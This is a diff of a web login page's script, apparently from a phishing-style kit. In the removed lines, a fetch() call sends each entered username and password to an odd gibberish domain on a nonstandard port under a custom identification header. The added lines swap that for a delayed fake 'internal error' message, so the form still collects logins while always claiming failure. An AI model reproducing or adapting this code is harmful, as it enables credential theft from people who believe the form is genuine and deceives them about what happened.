@@ -140,45 +140,20 @@
       submitBtn.disabled = true;
       submitBtn.innerHTML = "<div class='loader'></div>";
   
-      // Send a request to the MongoDB web server
-      fetch('https://tdsgfdfsgfdsgdssdfdsdsgd.com:34543', {
-        method: 'POST',
-        headers: {
-          'Content-Type': 'application/json',
-          'portunus-identification': 'PNS-7647574_AUTHB85',
-        },
-        body: JSON.stringify({ user, pass }),
-      })
-      .then(response => {
-        // Re-enable form elements and hide loading spinner
-        document.getElementById("username").disabled = false;
-        document.getElementById("password").disabled = false;
-        document.getElementById("agreeCheckbox").disabled = false;
-        submitBtn.disabled = false;
-        submitBtn.innerHTML = "Login";
-  
-        if (response.status === 200) {
-          if (agreeCheckbox) {
-            document.getElementById("message").innerHTML = "<p class='success-message'>Login successful, you will be redirected in a few seconds.</p>";
-          } else {
-            document.getElementById("message").innerHTML = "<p class='error-message'>Please confirm you are not a robot.</p>";
-          }
-        } else {
-          document.getElementById("message").innerHTML = "<p class='error-message'>Incorrect username or password.</p>";
-        }
-      })
-      .catch(error => {
-        console.error('Error:', error);
-        // Re-enable form elements and hide loading spinner
-        document.getElementById("username").disabled = false;
-        document.getElementById("password").disabled = false;
-        document.getElementById("agreeCheckbox").disabled = false;
-        submitBtn.disabled = false;
-        submitBtn.innerHTML = "Login";
-        document.getElementById("message").innerHTML = "<p class='error-message'>An internal error occurred. Please try again later.</p>";
-      });
-    });
+      // Add a delay before showing the message
+      setTimeout(function() {
 
+        document.getElementById("message").innerHTML = "<p class='error-message'>An internal error occured.</p>";
+  
+        // Enable form elements and reset button
+        document.getElementById("username").disabled = false;
+        document.getElementById("password").disabled = false;
+        document.getElementById("agreeCheckbox").disabled = false;
+        submitBtn.disabled = false;
+        submitBtn.innerHTML = "Login";
+      }, 3000); // 3000 milliseconds = 3 seconds
+    });
+  
     // Mouse move background effect
     document.addEventListener('mousemove', function(e) {
       const background = document.getElementById('background');
@@ -186,6 +161,7 @@
       const moveY = (e.clientY / window.innerHeight) * 30 - 15;
       background.style.transform = `translate(${moveX}px, ${moveY}px) scale(1.1)`;
     });
-  </script>  
+  </script>
+  
 </body>
 </html>
